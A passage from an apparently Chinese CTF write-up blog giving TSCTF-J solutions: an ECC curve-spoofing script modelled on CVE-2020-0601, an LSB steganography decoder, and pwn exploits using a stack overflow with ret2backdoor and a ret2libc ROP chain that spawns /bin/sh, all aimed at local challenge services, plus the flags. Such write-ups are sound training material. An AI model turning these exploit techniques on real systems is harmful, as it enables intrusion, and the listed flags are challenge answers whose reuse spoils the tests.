long_to_bytes(value)</span><br><span class="line"><span class="built_in">print</span>(flag.decode())</span><br></pre></td></tr></table></figure>

<p>TSCTF-J{We_sh0u1d_kn0w!}</p>
<h3 id="Microsoft’s-gifts"><a href="#Microsoft’s-gifts" class="headerlink" title="Microsoft’s gifts"></a>Microsoft’s gifts</h3><p>deepseek立大功</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> inverse</span><br><span class="line"></span><br><span class="line"><span class="comment"># secp256r1曲线参数</span></span><br><span class="line">p = <span class="number">0xFFFFFFFF00000001000000000000000000000000FFFFFFFFFFFFFFFFFFFFFFFF</span></span><br><span class="line">a = <span class="number">0xFFFFFFFF00000001000000000000000000000000FFFFFFFFFFFFFFFFFFFFFFFC</span></span><br><span class="line">b = <span class="number">0x5AC635D8AA3A93E7B3EBBD55769886BC651D06B0CC53B0F63BCE3C3E27D2604B</span></span><br><span class="line">n = <span class="number">0xFFFFFFFF00000000FFFFFFFFFFFFFFFFBCE6FAADA7179E84F3B9CAC2FC632551</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">EllipticCurve</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, a: <span class="built_in">int</span>, b: <span class="built_in">int</span>, p: <span class="built_in">int</span>, g: <span class="built_in">tuple</span>, name: <span class="built_in">str</span> = <span class="string">&quot;secp256r1&quot;</span></span>):</span><br><span class="line">        <span class="variable language_">self</span>.a = a</span><br><span class="line">        <span class="variable language_">self</span>.b = b</span><br><span class="line">        <span class="variable language_">self</span>.p = p</span><br><span class="line">        <span class="variable language_">self</span>.g = g</span><br><span class="line">        <span class="variable language_">self</span>.name = name</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">is_on_curve</span>(<span class="params">self, point: <span class="built_in">tuple</span></span>) -&gt; <span class="built_in">bool</span>:</span><br><span class="line">        <span class="keyword">if</span> point <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">        x, y = point</span><br><span class="line">        <span class="keyword">return</span> (y * y - x * x * x - <span class="variable language_">self</span>.a * x - <span class="variable language_">self</span>.b) % <span class="variable language_">self</span>.p == <span class="number">0</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">self, p1: <span class="built_in">tuple</span>, p2: <span class="built_in">tuple</span></span>) -&gt; <span class="built_in">tuple</span>:</span><br><span class="line">        <span class="keyword">if</span> p1 <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">            <span class="keyword">return</span> p2</span><br><span class="line">        <span class="keyword">if</span> p2 <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">            <span class="keyword">return</span> p1</span><br><span class="line">        x1, y1 = p1</span><br><span class="line">        x2, y2 = p2</span><br><span class="line">        <span class="keyword">if</span> x1 == x2 <span class="keyword">and</span> y1 != y2:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line">        <span class="keyword">if</span> x1 == x2:</span><br><span class="line">            m = (<span class="number">3</span> * x1 * x1 + <span class="variable language_">self</span>.a) * inverse(<span class="number">2</span> * y1, <span class="variable language_">self</span>.p)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            m = (y1 - y2) * inverse(x1 - x2, <span class="variable language_">self</span>.p)</span><br><span class="line">        m %= <span class="variable language_">self</span>.p</span><br><span class="line">        x3 = (m * m - x1 - x2) % <span class="variable language_">self</span>.p</span><br><span class="line">        y3 = (y1 + m * (x3 - x1)) % <span class="variable language_">self</span>.p</span><br><span class="line">        y3 = (-y3) % <span class="variable language_">self</span>.p</span><br><span class="line">        <span class="keyword">return</span> (x3, y3)</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">multiply</span>(<span class="params">self, k: <span class="built_in">int</span>, point: <span class="built_in">tuple</span></span>) -&gt; <span class="built_in">tuple</span>:</span><br><span class="line">        <span class="keyword">if</span> point <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line">        <span class="keyword">if</span> k &lt; <span class="number">0</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="variable language_">self</span>.multiply(-k, <span class="variable language_">self</span>.negate(point))</span><br><span class="line">        result = <span class="literal">None</span></span><br><span class="line">        addend = point</span><br><span class="line">        <span class="keyword">while</span> k:</span><br><span class="line">            <span class="keyword">if</span> k &amp; <span class="number">1</span>:</span><br><span class="line">                result = <span class="variable language_">self</span>.add(result, addend)</span><br><span class="line">            addend = <span class="variable language_">self</span>.add(addend, addend)</span><br><span class="line">            k &gt;&gt;= <span class="number">1</span></span><br><span class="line">        <span class="keyword">return</span> result</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">negate</span>(<span class="params">self, point: <span class="built_in">tuple</span></span>) -&gt; <span class="built_in">tuple</span>:</span><br><span class="line">        <span class="keyword">if</span> point <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line">        x, y = point</span><br><span class="line">        <span class="keyword">return</span> (x, (-y) % <span class="variable language_">self</span>.p)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    <span class="comment"># 连接到题目服务</span></span><br><span class="line">    r = remote(<span class="string">&#x27;127.0.0.1&#x27;</span>, <span class="number">61018</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 接收公钥</span></span><br><span class="line">    r.recvuntil(<span class="string">b&#x27;public key is &#x27;</span>)</span><br><span class="line">    pub_str = r.recvline().decode().strip()</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;Received public key: <span class="subst">&#123;pub_str&#125;</span>&quot;</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 解析公钥 - 处理带引号的十六进制字符串</span></span><br><span class="line">    pub_str = pub_str.replace(<span class="string">&#x27;(&#x27;</span>, <span class="string">&#x27;&#x27;</span>).replace(<span class="string">&#x27;)&#x27;</span>, <span class="string">&#x27;&#x27;</span>).replace(<span class="string">&quot;&#x27;&quot;</span>, <span class="string">&quot;&quot;</span>).replace(<span class="string">&quot; &quot;</span>, <span class="string">&quot;&quot;</span>)</span><br><span class="line">    x_str, y_str = pub_str.split(<span class="string">&#x27;,&#x27;</span>)</span><br><span class="line">    x_p = <span class="built_in">int</span>(x_str, <span class="number">16</span>)</span><br><span class="line">    y_p = <span class="built_in">int</span>(y_str, <span class="number">16</span>)</span><br><span class="line">    public_key = (x_p, y_p)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;Parsed public key: (<span class="subst">&#123;<span class="built_in">hex</span>(x_p)&#125;</span>, <span class="subst">&#123;<span class="built_in">hex</span>(y_p)&#125;</span>)&quot;</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 创建曲线对象</span></span><br><span class="line">    curve = EllipticCurve(a, b, p, <span class="literal">None</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 计算2的逆元 (mod n)</span></span><br><span class="line">    inv2 = inverse(<span class="number">2</span>, n)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;inverse of 2 mod n: <span class="subst">&#123;<span class="built_in">hex</span>(inv2)&#125;</span>&quot;</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 计算公钥的一半作为新的基点G</span></span><br><span class="line">    G_half = curve.multiply(inv2, public_key)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;New base point G: (<span class="subst">&#123;<span class="built_in">hex</span>(G_half[<span class="number">0</span>])&#125;</span>, <span class="subst">&#123;<span class="built_in">hex</span>(G_half[<span class="number">1</span>])&#125;</span>)&quot;</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 验证新基点是否在曲线上</span></span><br><span class="line">    <span class="keyword">if</span> curve.is_on_curve(G_half):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;New base point is on curve ✓&quot;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;ERROR: New base point is not on curve!&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 发送曲线参数</span></span><br><span class="line">    r.recvuntil(<span class="string">b&#x27;Tell me your curve now: [p, a, b]&#x27;</span>)</span><br><span class="line">    r.sendline(<span class="string">f&#x27;[<span class="subst">&#123;p&#125;</span>, <span class="subst">&#123;a&#125;</span>, <span class="subst">&#123;b&#125;</span>]&#x27;</span>.encode())</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Sent curve parameters&quot;</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 发送基点G</span></span><br><span class="line">    r.recvuntil(<span class="string">b&#x27;Tell me your g which is on the curve: [gx, gy]&#x27;</span>)</span><br><span class="line">    r.sendline(<span class="string">f&#x27;[<span class="subst">&#123;G_half[<span class="number">0</span>]&#125;</span>, <span class="subst">&#123;G_half[<span class="number">1</span>]&#125;</span>]&#x27;</span>.encode())</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Sent base point G&quot;</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 发送私钥</span></span><br><span class="line">    r.recvuntil(<span class="string">b&#x27;Tell me your private_key: key&#x27;</span>)</span><br><span class="line">    r.sendline(<span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Sent private key: 2&quot;</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 接收结果</span></span><br><span class="line">    result = r.recvline().decode()</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;Result: <span class="subst">&#123;result&#125;</span>&quot;</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 尝试接收更多输出（比如flag）</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">            line = r.recvline(timeout=<span class="number">2</span>).decode()</span><br><span class="line">            <span class="built_in">print</span>(line)</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line">    </span><br><span class="line">    r.close()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>

<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://luhaoblog.oss-cn-hangzhou.aliyuncs.com/img1/image-20251013101730857.png" alt="image-20251013101730857"></p>
<p>TSCTF-J{Microsoft-CVE-2020-0601}</p>
<h2 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h2><h3 id="调查问卷"><a href="#调查问卷" class="headerlink" title="调查问卷"></a>调查问卷</h3><p>TSCTF-J{Th4nk5_F0r_Y0ur_4ttend1n9}</p>
<h3 id="卢森堡的秘密"><a href="#卢森堡的秘密" class="headerlink" title="卢森堡的秘密"></a>卢森堡的秘密</h3><p>图片binwalk -e secret.png 发现有zip</p>
<p>提出来的时候失败了</p>
<p>万能的AI给了个神奇的脚本</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> struct, zlib</span><br><span class="line"></span><br><span class="line">w, h, bpp = <span class="number">1920</span>, <span class="number">1607</span>, <span class="number">3</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">paeth</span>(<span class="params">a, b, c</span>):</span><br><span class="line">    p = a + b - c</span><br><span class="line">    pa, pb, pc = <span class="built_in">abs</span>(p - a), <span class="built_in">abs</span>(p - b), <span class="built_in">abs</span>(p - c)</span><br><span class="line">    <span class="keyword">if</span> pa &lt;= pb <span class="keyword">and</span> pa &lt;= pc:</span><br><span class="line">        <span class="keyword">return</span> a</span><br><span class="line">    <span class="keyword">if</span> pb &lt;= pc:</span><br><span class="line">        <span class="keyword">return</span> b</span><br><span class="line">    <span class="keyword">return</span> c</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;secret.png&quot;</span>, <span class="string">&quot;rb&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    <span class="keyword">assert</span> f.read(<span class="number">8</span>) == <span class="string">b&quot;\x89PNG\r\n\x1a\n&quot;</span></span><br><span class="line">    idat = <span class="string">b&quot;&quot;</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        length, ctype = struct.unpack(<span class="string">&quot;&gt;I4s&quot;</span>, f.read(<span class="number">8</span>))</span><br><span class="line">        data, crc = f.read(length), f.read(<span class="number">4</span>)</span><br><span class="line">        <span class="keyword">if</span> ctype == <span class="string">b&quot;IDAT&quot;</span>:</span><br><span class="line">            idat += data</span><br><span class="line">        <span class="keyword">elif</span> ctype == <span class="string">b&quot;IEND&quot;</span>:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">raw = zlib.decompress(idat)</span><br><span class="line">stride, prev, pixels, off = w * bpp, [<span class="number">0</span>] * (w * bpp), [], <span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(h):</span><br><span class="line">    ftype = raw[off]</span><br><span class="line">    row = <span class="built_in">bytearray</span>(raw[off + <span class="number">1</span>:off + <span class="number">1</span> + stride])</span><br><span class="line">    <span class="keyword">if</span> ftype == <span class="number">1</span>:</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(stride):</span><br><span class="line">            row[i] = (row[i] + (row[i - bpp] <span class="keyword">if</span> i &gt;= bpp <span class="keyword">else</span> <span class="number">0</span>)) &amp; <span class="number">0xFF</span></span><br><span class="line">    <span class="keyword">elif</span> ftype == <span class="number">2</span>:</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(stride):</span><br><span class="line">            row[i] = (row[i] + prev[i]) &amp; <span class="number">0xFF</span></span><br><span class="line">    <span class="keyword">elif</span> ftype == <span class="number">3</span>:</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(stride):</span><br><span class="line">            left = row[i - bpp] <span class="keyword">if</span> i &gt;= bpp <span class="keyword">else</span> <span class="number">0</span></span><br><span class="line">            up = prev[i]</span><br><span class="line">            row[i] = (row[i] + ((left + up) &gt;&gt; <span class="number">1</span>)) &amp; <span class="number">0xFF</span></span><br><span class="line">    <span class="keyword">elif</span> ftype == <span class="number">4</span>:</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(stride):</span><br><span class="line">            left = row[i - bpp] <span class="keyword">if</span> i &gt;= bpp <span class="keyword">else</span> <span class="number">0</span></span><br><span class="line">            up = prev[i]</span><br><span class="line">            up_left = prev[i - bpp] <span class="keyword">if</span> i &gt;= bpp <span class="keyword">else</span> <span class="number">0</span></span><br><span class="line">            row[i] = (row[i] + paeth(left, up, up_left)) &amp; <span class="number">0xFF</span></span><br><span class="line">    pixels.extend(row)</span><br><span class="line">    prev, off = <span class="built_in">list</span>(row), off + stride + <span class="number">1</span></span><br><span class="line"></span><br><span class="line">bits = [p &amp; <span class="number">1</span> <span class="keyword">for</span> p <span class="keyword">in</span> pixels]</span><br><span class="line">msg = <span class="built_in">bytearray</span>()</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(bits), <span class="number">8</span>):</span><br><span class="line">    byte = <span class="number">0</span></span><br><span class="line">    chunk = bits[i:i + <span class="number">8</span>]</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(chunk) &lt; <span class="number">8</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">for</span> b <span class="keyword">in</span> chunk:</span><br><span class="line">        byte = (byte &lt;&lt; <span class="number">1</span>) | b</span><br><span class="line">    <span class="keyword">if</span> byte == <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    msg.append(byte)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(msg.decode())</span><br></pre></td></tr></table></figure>

<p>TSCTF-J{Th3_sEcre7_0f_L$B!}</p>
<h3 id="Meow"><a href="#Meow" class="headerlink" title="Meow"></a>Meow</h3><p>解压meow.zip得到<strong>xml</strong>里面有base64码表</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://luhaoblog.oss-cn-hangzhou.aliyuncs.com/img1/image-20251011183403149.png" alt="image-20251011183403149"></p>
<p>TSCTF-J{1_Am_4_CaT_MeowMe0w!!!}</p>
<h2 id="Pwn"><a href="#Pwn" class="headerlink" title="Pwn"></a>Pwn</h2><h3 id="ret"><a href="#ret" class="headerlink" title="ret"></a>ret</h3><p>超级入门题，直接ret2backdoor</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment"># context(log_level=&#x27;debug&#x27;, arch=&#x27;i386&#x27;, os=&#x27;linux&#x27;)</span></span><br><span class="line"><span class="comment"># context(log_level=&#x27;debug&#x27;,arch=&#x27;amd64&#x27;, os=&#x27;linux&#x27;)</span></span><br><span class="line"><span class="comment"># pwnfile = &#x27;../toolcode/libc-2.23.so&#x27;</span></span><br><span class="line"></span><br><span class="line">io = remote(<span class="string">&#x27;127.0.0.1&#x27;</span>, <span class="number">50262</span>)</span><br><span class="line"><span class="comment"># libc = ELF(&#x27;../toolcode/libc-2.23.so&#x27;)</span></span><br><span class="line"><span class="comment"># rop = ROP(pwnfile)</span></span><br><span class="line"></span><br><span class="line">padding = <span class="number">0x10</span> + <span class="number">0x8</span></span><br><span class="line">io.recvuntil(<span class="string">b&quot;sign-in!&quot;</span>)</span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span> * padding + p64(<span class="number">0x400676</span>)</span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>

<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://luhaoblog.oss-cn-hangzhou.aliyuncs.com/img1/image-20251011140426789.png" alt="image-20251011140426789"></p>
<h3 id="pop"><a href="#pop" class="headerlink" title="pop"></a>pop</h3><p>利用溢出打pop ret</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">from</span> subprocess <span class="keyword">import</span> PIPE</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">os.environ.setdefault(<span class="string">&quot;PWNLIB_CACHE_DIR&quot;</span>, <span class="string">&quot;./.pwncache&quot;</span>)</span><br><span class="line">os.makedirs(<span class="string">&quot;./.pwncache&quot;</span>, exist_ok=<span class="literal">True</span>)</span><br><span class="line">context.cache_dir = <span class="string">&quot;./.pwncache&quot;</span></span><br><span class="line"></span><br><span class="line">context.binary = ELF(<span class="string">&quot;./pwn&quot;</span>)</span><br><span class="line">libc = ELF(<span class="string">&quot;./libc-2.23.so&quot;</span>)</span><br><span class="line"></span><br><span class="line">HOST, PORT = <span class="string">&quot;127.0.0.1&quot;</span>, <span class="number">58982</span></span><br><span class="line"></span><br><span class="line">POP_RDI_RET = <span class="number">0x400713</span></span><br><span class="line">RET = <span class="number">0x4004c9</span></span><br><span class="line">PUTS_PLT = context.binary.plt[<span class="string">&quot;puts&quot;</span>]</span><br><span class="line">PUTS_GOT = context.binary.got[<span class="string">&quot;puts&quot;</span>]</span><br><span class="line">MAIN = context.binary.symbols[<span class="string">&quot;main&quot;</span>]</span><br><span class="line"></span><br><span class="line">OFFSET = <span class="number">0x18</span>  </span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">start</span>():</span><br><span class="line">    <span class="keyword">return</span> remote(HOST, PORT)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">leak_libc</span>(<span class="params">p</span>):</span><br><span class="line">    payload = flat(</span><br><span class="line">        <span class="string">b&quot;A&quot;</span> * OFFSET,</span><br><span class="line">        POP_RDI_RET,</span><br><span class="line">        PUTS_GOT,</span><br><span class="line">        PUTS_PLT,</span><br><span class="line">        MAIN,</span><br><span class="line">    )</span><br><span class="line"></span><br><span class="line">    p.sendlineafter(<span class="string">b&quot;No backdoors this time!\n&quot;</span>, payload)</span><br><span class="line">    leak_line = p.recvline().rstrip(<span class="string">b&quot;\n&quot;</span>)</span><br><span class="line">    leak_line += <span class="string">b&quot;\x00&quot;</span> * (<span class="number">8</span> - <span class="built_in">len</span>(leak_line))</span><br><span class="line">    leak_addr = u64(leak_line)</span><br><span class="line">    libc_base = leak_addr - libc.symbols[<span class="string">&quot;puts&quot;</span>]</span><br><span class="line"></span><br><span class="line">    log.success(<span class="string">f&quot;Leaked puts@GLIBC: <span class="subst">&#123;<span class="built_in">hex</span>(leak_addr)&#125;</span>&quot;</span>)</span><br><span class="line">    log.success(<span class="string">f&quot;Computed libc base: <span class="subst">&#123;<span class="built_in">hex</span>(libc_base)&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> libc_base</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">pwn</span>():</span><br><span class="line">    p = start()</span><br><span class="line"></span><br><span class="line">    libc_base = leak_libc(p)</span><br><span class="line"></span><br><span class="line">    system = libc_base + libc.symbols[<span class="string">&quot;system&quot;</span>]</span><br><span class="line">    bin_sh = libc_base + <span class="built_in">next</span>(libc.search(<span class="string">b&quot;/bin/sh&quot;</span>))</span><br><span class="line"></span><br><span class="line">    log.info(<span class="string">f&quot;system @ <span class="subst">&#123;<span class="built_in">hex</span>(system)&#125;</span>&quot;</span>)</span><br><span class="line">    log.info(<span class="string">f&quot;&#x27;/bin/sh&#x27; @ <span class="subst">&#123;<span class="built_in">hex</span>(bin_sh)&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line">    payload = flat(</span><br><span class="line">        <span class="string">b&quot;A&quot;</span> * OFFSET,</span><br><span class="line">        RET,</span><br><span class="line">        POP_RDI_RET,</span><br><span class="line">        bin_sh,</span><br><span class="line">        system,</span><br><span class="line">    )</span><br><span class="line"></span><br><span class="line">    p.sendlineafter(<span class="string">b&quot;No backdoors this time!\n&quot;</span>, payload)</span><br><span class="line">    p.interactive()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    pwn()</span><br><span class="line"></span><br></pre></td></tr></table></figure>

